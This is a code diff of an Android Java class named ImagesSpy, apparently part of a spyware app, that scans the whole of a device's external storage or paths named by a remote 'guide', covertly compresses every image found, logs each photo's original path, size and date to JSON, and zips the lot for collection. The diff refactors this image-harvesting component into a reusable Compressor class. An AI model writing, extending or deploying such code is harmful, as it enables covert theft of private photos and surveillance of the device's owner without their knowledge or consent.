@@ -3,143 +3,179 @@ package com.gameofcoding.spy.spys;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
-import android.os.Environment;
-import com.gameofcoding.spy.utils.XLog;
+import android.graphics.Canvas;
+import android.graphics.Matrix;
+import android.graphics.Paint;
+import com.gameofcoding.spy.guides.ImagesSpyGuide;
+import com.gameofcoding.spy.utils.AppConstants;
 import com.gameofcoding.spy.utils.FileUtils;
+import com.gameofcoding.spy.utils.Utils;
+import com.gameofcoding.spy.utils.XLog;
 import com.gameofcoding.spy.utils.ZipUtils;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.text.DecimalFormat;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
-import java.util.ArrayList;
-import org.json.JSONArray;
-import org.json.JSONException;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ExecutionException;
-import java.util.concurrent.Future;
 import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
+import org.json.JSONArray;
 import org.json.JSONObject;
 
+/**
+ * Compresses and saves images in a zip file
+ */
 public class ImagesSpy implements Spy {
-    private final String TAG = "ImagesSpy";
+    private static final String TAG = "ImagesSpy";
+
     public static final String IMAGES_DIR_NAME = "images";
-    public static final String IMAGES_PROPS_FILE_NAME = "images.json";
     public static final String IMAGES_ZIP_FILE_NAME = "images.zip";
-    private final ExecutorService mExecutor = Executors.newCachedThreadPool();
+    public static final String IMAGES_PROPS_FILE_NAME = "images.json";
+
+    private final File ROOT_DIR = AppConstants.EXTERNAL_STORAGE_DIR;
+    /*
+     * We cannot use multithreads to increase compression speed because android's heap size
+     * is very limited and if we try to use multiple threads it may throw OutOfMemoryError.
+     * Here we are now using only two threads for compression which are enough for medium number
+     * of photos.
+     */
+    private final ExecutorService mExecutor = Executors.newFixedThreadPool(2);
     private final List<Future<?>> mExecFutures = new ArrayList<Future<?>>();
-    public static File mExcepDirs[];
+    private final JSONArray mImagesProps = new JSONArray();
+    private ImagesSpyGuide mGuide;
     private File mDestDir;
-    private final File ROOT_DIR = Environment.getExternalStorageDirectory();
-    private final JSONArray imagesProps = new JSONArray();
 
     public ImagesSpy(Context context, File destDir) {
 	mDestDir = destDir;
-	if(!mDestDir.exists())
-	    mDestDir.mkdirs();
-	final File androidFolder = new File(ROOT_DIR, "Android");
-	File sickboyDir = new File(ROOT_DIR, "SickBoyDir");
-	File appProject = new File(ROOT_DIR, "AppProjects");
-	File whatsApp = new File(ROOT_DIR, "WhatsApp");
-	mExcepDirs = new File[] {
-	    destDir,
-	    androidFolder,
-	    appProject,
-	    sickboyDir,
-	    whatsApp
-	};
+	mGuide = new ImagesSpyGuide(ROOT_DIR);
+	if(!mGuide.saveImages) {
+	    XLog.v(TAG, "Guide: Saving images disabled");
+	    return;
+	}
+
+	// Create destination directory if it does not exist
+	if(!mDestDir.exists()) {
+	    if(!mDestDir.mkdirs()) {
+		throw new RuntimeException("Couldn't create directory for images, mDestDir "
+					   + mDestDir);
+	    }
+	}
     }
 
     @Override
     public void snoop() {
-	scanDir(ROOT_DIR, mDestDir);
-	try {
-	    try {
-		for(Future<?> execFuture : mExecFutures)
-		    execFuture.get();
-	    } catch(ExecutionException e) {
-		XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
-	    } catch(InterruptedException e){
-		XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
+	if(!mGuide.saveImages)
+	    return;
+
+	if(mGuide.imagesToBeLoaded != null) {
+	    // we have been told to load only specific images
+	    for(File file : mGuide.imagesToBeLoaded) {
+		if(file.isDirectory()) {
+		    scanDir(file, mDestDir);
+		    continue;
+		}
+
+		Compressor compressor = Compressor.loadIfImage(file, mGuide);
+		if(compressor != null)
+		    compressAndStoreImage(compressor, file, mDestDir);
 	    }
+	} else {
+	    // Scan all images from root directory of internal storage
+	    scanDir(ROOT_DIR, mDestDir);
+	}
+
+	try {
+	    // Wait until all images are compressed and stored
+	    for(Future<?> execFuture : mExecFutures)
+		execFuture.get();
+	} catch(Exception e) {
+	    XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
+	}
+
+	try {
+	    // Write image props to file
+	    FileUtils.write(new File(mDestDir, IMAGES_PROPS_FILE_NAME), mImagesProps.toString());
+
 	    // Zip scanned files
 	    XLog.i(TAG, "Zipping images...");
 	    ZipUtils zipUtils = new ZipUtils();
 	    File[] filesToZip  = mDestDir.listFiles();
-	    File zipDestDir = new File(mDestDir, IMAGES_ZIP_FILE_NAME);
-	    zipUtils.zip(filesToZip, zipDestDir);
-	    XLog.i(TAG, "Deleting zipped images");
-	    for(File file : filesToZip) {
-		if(!file.delete())
-		    XLog.i(TAG, "Could'nt delete images, file=" + file);
+	    File zipDestFile = new File(mDestDir, IMAGES_ZIP_FILE_NAME);
+	    if(zipDestFile.exists()) {
+		if(zipDestFile.delete())
+		    XLog.i(TAG, "Destination zip file deleted!");
+		else
+		    XLog.e(TAG, "Destination zip could not be deleted!");
 	    }
-	    XLog.i(TAG, "Zipped and deleted (zipped images)");
+	    zipUtils.zip(filesToZip, zipDestFile, true);
+	    XLog.i(TAG, "Images zipped");
 	} catch(Exception e) {
-	    XLog.e(TAG, "Exception occurred while zipping scanned images", e);
+	    XLog.e(TAG, "Exception occurred while zipping saved images", e);
 	}
+    }
+
+    private File generateFile(File sourceFile, File destDir) {
+	String fileName = sourceFile.getName();
+
+	// Add format at the end if it has not
+	if(!fileName.contains("."))
+	    fileName += ".jpeg";
+
+	File destFile = new File(destDir, fileName);
+
+	int suffix = 1;
+	while(destFile.exists()) {
+	    String newFileName = fileName;
+	    String fileSuffix = "(" + suffix++ + ")";
+	    // e.g img.jpeg > img(n).jpeg
+	    newFileName = newFileName.substring(0, newFileName.lastIndexOf("."))
+		+ fileSuffix
+		+ newFileName.substring(newFileName.lastIndexOf("."),
+					newFileName.length());
+	    destFile = new File(mDestDir, newFileName);
+	}
+
 	try {
-	    FileUtils.write(new File(mDestDir, IMAGES_PROPS_FILE_NAME), imagesProps.toString());
+	    if(!destFile.createNewFile()) {
+		XLog.e(TAG, "generateFile(File, File): Couldn't create file: " + destFile);
+		return null;
+	    }
+	    return destFile;
 	} catch(IOException e) {
-	    XLog.e(TAG, "snoop(): Error occurred while saving image props.", e);
+	    XLog.e(TAG, "generateFile(File, File): Couldn't create file: " + destFile, e);
+	    return null;
 	}
     }
 
     private void scanDir(final File directory, final File destDir) {
-	if (directory.isDirectory()) {
-	    // Return if directory is not to be scanned
-	    for(File exceptFile : mExcepDirs) {
-		if(directory.toString().equals(exceptFile.toString())) {
-		    XLog.v(TAG, "scanDir(File): skipping dir, directory=" + directory);
-		    return;
-		}
+	// Return if it is hidden and if guide instructs to omit hidden directories
+	if(directory.isHidden() && !(mGuide.scanHiddenFiles)) {
+	    XLog.v(TAG, "scanDir(File, File): skipping hidden directory: " + directory);
+	    return;
+	}
+
+	// Return if directory is not to be scanned
+	for(File exceptFile : mGuide.exceptFiles) {
+	    if(directory.getAbsolutePath().equals(exceptFile.getAbsolutePath())) {
+		XLog.v(TAG, "scanDir(File, File): skipping directory: " + directory);
+		return;
 	    }
-	    //	    XLog.v(TAG, "Scanning Dir: " + directory.toString());
+	}
+
+	// Load directory
+	if (directory.isDirectory()) {
+	    //XLog.d(TAG, "Scanning Dir: " + directory.toString());
 	    for (final File file : directory.listFiles()) {
 		if (file.isDirectory()) {
 		    scanDir(file, destDir);
+		    continue;
 		}
-		else {
-		    if (isImage(file)) {
-			// Generate new file for storing compressed image
-			File destFile = new File(mDestDir, file.getName());
-			int suffix = 1;
-			while(destFile.exists()) {
-			    String newFileName = file.getName();
-			    String fileSuffix = "(" + suffix++ + ")";
-			    if(newFileName.contains(".")) {
-				// e.g test.txt > test(n).txt
-				newFileName = newFileName.substring(0, newFileName.lastIndexOf("."))
-				    + fileSuffix
-				    + newFileName.substring(newFileName.lastIndexOf("."), newFileName.length());;
-			    } else {
-				// e.g text > text(n)
-				newFileName += fileSuffix;
-			    }
-			    destFile = new File(mDestDir, newFileName);
-			}
 
-			try {
-			    if(!destFile.createNewFile()) {
-				XLog.e(TAG, "Could'nt create file, file=" + destFile + ", skipping image");
-				continue;
-			    }
-			} catch(IOException e) {
-			    XLog.e(TAG, "Failed to create dest. file, destFile=" + destFile, e);
-			    continue;
-			}
-			final File tempDestFile = destFile;
-			// File is an image, compress and store it
-			Future<?> execFuture  = mExecutor.submit(new Runnable() {
-				@Override
-				public void run() {
-				    if(!handleImageProcessing(file, tempDestFile))
-					tempDestFile.delete();
-				}
-			    });
-			mExecFutures.add(execFuture);
-		    }
-		}
+		Compressor compressor = Compressor.loadIfImage(file, mGuide);
+		if (compressor != null)
+		    compressAndStoreImage(compressor, file, destDir);
 	    }
 	} else {
 	    if(directory.isFile())
@@ -147,92 +183,191 @@ public class ImagesSpy implements Spy {
 	    else if(!directory.exists())
 		XLog.e(TAG, "scanDir(File): file="+directory+", does not exist!");
 	    else
-		XLog.e(TAG, "scanDir(File): file="+directory+", could not be loaded!");
+		XLog.e(TAG, "scanDir(File): file="+directory+", couldn't be loaded!");
 	}
     }
 
-    private boolean handleImageProcessing(File sourceFile, File destFile) {
-	Bitmap compressedImage = compressImage(sourceFile.toString());
-	if(compressedImage == null)
-	    return false;
+    private void compressAndStoreImage(Compressor compressor, File sourceFile, File destDir) {
+	// Generate new file for storing compressed image
+	final File destFile = generateFile(sourceFile, destDir);
 
-	// Save details about image in json properties file
-	Bitmap bitmapImage = BitmapFactory.decodeFile(sourceFile.toString());
-	if(bitmapImage == null)
-	    return false;
-	String imagePath = sourceFile.toString();
-	String actualResolution =
-	    bitmapImage.getWidth() + "x" + bitmapImage.getHeight();
-	String compressedResolution =
-	    compressedImage.getWidth() + "x" + compressedImage.getHeight();
-	if(actualResolution.equals(compressedResolution))
-	    compressedResolution = "UNCOMPRESSED";
-	String readableSize = readableFileSize(sourceFile.length());
-	String lastModified = new Date(sourceFile.lastModified()).toString();
-	try {
-	    JSONObject image = new JSONObject();
-	    image.put("Path: ", imagePath);
-	    image.put("New Name: ", destFile.getName());
-	    image.put("Resol.: ", actualResolution);
-	    image.put("Comp. Resol.: ", compressedResolution);
-	    image.put("Size: ", readableSize);
-	    image.put("Modified: ", lastModified);
-	    imagesProps.put(image);
-	} catch(JSONException e) {
-	    XLog.e(TAG, "Exception occured while saving image props.", e);
-	}
-	// Finally store compressed image
-	storeImage(compressedImage, destFile);
-	return true;
+	Future<?> execFuture  = mExecutor.submit(() -> {
+		compressor.compress()
+		    .storeImage(destFile)
+		    .loadImageDetails()
+		    .close();
+		// JSONArray is not thread safe so we will make it synchronized
+		synchronized(this) {
+		    mImagesProps.put(compressor.getImageProps());
+		}
+	    });
+	mExecFutures.add(execFuture);
+    }
+}
+
+class Compressor {
+    private static final String TAG = "Compressor";
+    private File mSourceFile;
+    private File mDestFile;
+    private ImagesSpyGuide mGuide;
+    private Bitmap mScaledBitmap;
+    private BitmapFactory.Options mOptions;
+    private JSONObject mImageProps;
+
+    private Compressor(File sourceFile, BitmapFactory.Options options, ImagesSpyGuide guide) {
+	mSourceFile = sourceFile;
+	mOptions = options;
+	mGuide = guide;
     }
 
-    private boolean isImage(File file) {
-	if (file == null || !file.exists())
-	    return false;
+    public static Compressor loadIfImage(File sourceFile, ImagesSpyGuide guide) {
+	if (sourceFile == null || !sourceFile.exists())
+	    return null;
 	BitmapFactory.Options options = new BitmapFactory.Options();
 	options.inJustDecodeBounds = true;
-	BitmapFactory.decodeFile(file.toString(), options);
-	return (options.outWidth > 0 && options.outHeight > 0);
-    }
-    
-    private String readableFileSize(long size) {
-	if(size <= 0) return "0";
-	String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
-	int digitGroups = (int) (Math.log10(size)/Math.log10(1024));
-	return new DecimalFormat("#,##0.#").format(size/Math.pow(1024, digitGroups)) + " " + units[digitGroups];
+	BitmapFactory.decodeFile(sourceFile.toString(), options);
+	if(options.outWidth > 0 && options.outHeight > 0)
+	    return new Compressor(sourceFile, options, guide);
+	return null;
     }
 
-    private Bitmap compressImage(String path) {
-	Bitmap bitmapImage = BitmapFactory.decodeFile(path);
-	if(bitmapImage == null) {
-	    XLog.w(TAG, "compressImage(String): Could not compress image, PATH=" + path);
+    private int calculateInSampleSize(int reqWidth, int reqHeight) {
+	// Raw height and width of image
+	final int height = mOptions.outHeight;
+	final int width = mOptions.outWidth;
+	
+	int inSampleSize = 1;
+
+	if (height > reqHeight || width > reqWidth) {
+	    final int halfHeight = height / 2;
+	    final int halfWidth = width / 2;
+
+	    // Calculate the largest inSampleSize value that is a power of 2 and keeps both
+	    // height and width larger than the requested height and width.
+	    while ((halfHeight / inSampleSize) >= reqHeight
+		   && (halfWidth / inSampleSize) >= reqWidth) {
+		inSampleSize *= 2;
+	    }
+	}
+	return inSampleSize;
+    }
+
+    public Compressor compress() {
+	String imagePath = mSourceFile.toString();
+
+	// actual width and height of image
+        int actualHeight = mOptions.outHeight;
+        int actualWidth = mOptions.outWidth;
+
+	// max Height and width values of the compressed image is taken as 816x612
+        float maxHeight = mGuide.maxWidth;
+        float maxWidth = mGuide.maxHeight;
+        float imgRatio = actualWidth / actualHeight;
+        float maxRatio = maxWidth / maxHeight;
+
+	// width and height values are set maintaining the aspect ratio of the image
+        if (actualHeight > maxHeight || actualWidth > maxWidth) {
+            if (imgRatio < maxRatio) {
+                imgRatio = maxHeight / actualHeight;
+                actualWidth = (int) (imgRatio * actualWidth);
+                actualHeight = (int) maxHeight;
+            } else if (imgRatio > maxRatio) {
+                imgRatio = maxWidth / actualWidth;
+                actualHeight = (int) (imgRatio * actualHeight);
+                actualWidth = (int) maxWidth;
+            } else {
+                actualHeight = (int) maxHeight;
+                actualWidth = (int) maxWidth;
+            }
+        }
+
+	// setting inSampleSize value allows to load a scaled down version of the original image
+        mOptions.inSampleSize = calculateInSampleSize(actualWidth, actualHeight);
+
+	// inJustDecodeBounds set to false to load the actual bitmap
+        mOptions.inJustDecodeBounds = false;
+	Bitmap bitmapImage = null;
+        try {
+	    // load the bitmap from its path
+            bitmapImage = BitmapFactory.decodeFile(imagePath, mOptions);
+	    mScaledBitmap = Bitmap.createBitmap(actualWidth, actualHeight, Bitmap.Config.ARGB_8888);
+        } catch (OutOfMemoryError e) {
+	    XLog.e(TAG, "Exception occured while loading bitmap in memory", e);
+        }
+
+        float ratioX = actualWidth / (float) mOptions.outWidth;
+        float ratioY = actualHeight / (float) mOptions.outHeight;
+        float middleX = actualWidth / 2.0f;
+        float middleY = actualHeight / 2.0f;
+
+        Matrix scaleMatrix = new Matrix();
+        scaleMatrix.setScale(ratioX, ratioY, middleX, middleY);
+
+        Canvas canvas = new Canvas(mScaledBitmap);
+        canvas.setMatrix(scaleMatrix);
+        canvas.drawBitmap(bitmapImage,
+			  middleX - bitmapImage.getWidth() / 2,
+			  middleY - bitmapImage.getHeight() / 2,
+			  new Paint(Paint.FILTER_BITMAP_FLAG));
+	mScaledBitmap = Bitmap.createBitmap(mScaledBitmap, 0, 0,
+					    mScaledBitmap.getWidth(),
+					    mScaledBitmap.getHeight(),
+					    null, true);
+	return this;
+    }
+
+    public Compressor storeImage(File destFile) {
+	if(mScaledBitmap == null || destFile == null)
 	    return null;
-	}
+	mDestFile = destFile;
 
-	if(bitmapImage.getWidth() < 45 || bitmapImage.getHeight() < 70) {
-	    XLog.v(TAG, "Image, '" + path + "' is too small to be compressed!");
-	    return bitmapImage;
-	}
-
-	// Make image 45px wide and ratio according to that
-	int newWidth = 45;
-	int newHeight = (int) (bitmapImage.getHeight() * (40.0 / bitmapImage.getWidth()));
-	//XLog.v(TAG, "Compressing image, path=" + path + ", newWidth " + newWidth + ", newHeight " + newHeight);
-	Bitmap scaled = Bitmap.createScaledBitmap(bitmapImage, newWidth, newHeight, true);
-	return scaled;
-    }
-
-    private void storeImage(Bitmap image, File destFile) {
-	if(image == null || destFile == null)
-	    return;
-	//XLog.v(TAG, "Storing image: to=" + destFile);
 	try {
 	    FileOutputStream fos = new FileOutputStream(destFile);
-	    image.compress(Bitmap.CompressFormat.PNG, 100, fos);
+	    mScaledBitmap.compress(Bitmap.CompressFormat.JPEG, mGuide.imageQuality, fos);
 	    fos.close();
-	} catch (IOException e) {
+	    return this;
+	} catch (Exception e) {
 	    XLog.e(TAG, "Error occurred while storing image", e);
+	    return null;
 	}
     }
 
+    public JSONObject getImageProps() {
+	return mImageProps;
+    }
+
+    public Compressor loadImageDetails() {
+	if(mOptions == null || mScaledBitmap == null)
+	    return null;
+
+	// Save details about image in json properties file
+	String imagePath = mSourceFile.toString();
+	// Replace '/storage/emulated/0/' with 'inter/' to save some space
+	imagePath = imagePath.replace(AppConstants.EXTERNAL_STORAGE_DIR.toString(),
+				      "inter/");
+	String actualResolution =
+	    mOptions.outWidth + "x" + mOptions.outHeight;
+	String compressedResolution =
+	    mScaledBitmap.getWidth() + "x" + mScaledBitmap.getHeight();
+	if(actualResolution.equals(compressedResolution))
+	    compressedResolution = "UNCOMPRESSED";
+	String readableSize = Utils.readableFileSize(mSourceFile.length());
+	String lastModified = new Date(mSourceFile.lastModified()).toString();
+	try {
+	    mImageProps = new JSONObject();
+	    mImageProps.put("Path: ", imagePath);
+	    mImageProps.put("New Name: ", mDestFile.getName());
+	    mImageProps.put("Resol.: ", actualResolution + "  ->  " + compressedResolution);
+	    mImageProps.put("Size: ", readableSize);
+	    mImageProps.put("Modified: ", lastModified);
+	    return this;
+	} catch(Exception e) {
+	    XLog.e(TAG, "Exception occured while saving image props.", e);
+	    return null;
+	}
+    }
+
+    public void close() {
+	mScaledBitmap.recycle();
+    }
 }
